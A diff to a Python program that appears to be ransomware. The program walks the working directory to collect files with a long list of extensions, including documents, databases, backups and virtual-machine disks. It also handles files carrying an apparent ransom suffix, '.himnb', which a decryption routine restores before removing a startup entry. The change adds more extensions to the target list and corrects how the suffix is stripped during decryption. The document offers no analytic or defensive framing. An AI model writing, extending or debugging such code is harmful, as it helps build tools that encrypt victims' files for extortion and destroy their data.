@@ -99,7 +99,7 @@ class listfile:
                       '.sql','.mdb','.bak','.old','.txt','.cpp','.js','.h','.cs','.bin','.webp','.mov','.wmv','.rtf',
                       '.gz','.odt','.e','.log','.ogg','.php','.go','.rs','.xml','.json','.yml','.css','.dll','.1cd','.ghost',
                       '.vmx','.vmem','.vmdk','.obj','.pyd','.pyc','.bat','.csv','.swf','.flv','.ai','.psd','.wma','.aac',
-                      '.tif','.data','.jfif','.rdp','apk','.ico']  
+                      '.tif','.data','.jfif','.rdp','apk','.ico','.jpeg','.config','.cfg','.iml']  
         result = []
         for root, _ ,files in os.walk(os.getcwd()):
             for file in files:
@@ -121,7 +121,7 @@ class listfile:
         for dirpath, _, filenames in os.walk(os.getcwd()):
             for filename in filenames:
                 full_path = os.path.join(dirpath, filename)
-                if filename.endswith(".himnb") and not os.path.islink(full_path) and full_path:  # `full_path != ''` can be simplified as `full_path`
+                if filename.endswith(".himnb") and not os.path.islink(full_path) and full_path:  
                     matching.append(full_path)
 
         return matching
@@ -147,7 +147,7 @@ def deencryption():
                 try:
                     fnames = cip(f7)
                     fnames.decryption()
-                    os.rename(f7,f7.strip('.himnb'))
+                    os.rename(f7,f7[:-6])
                 except:
                     pass
             os.remove(startup)
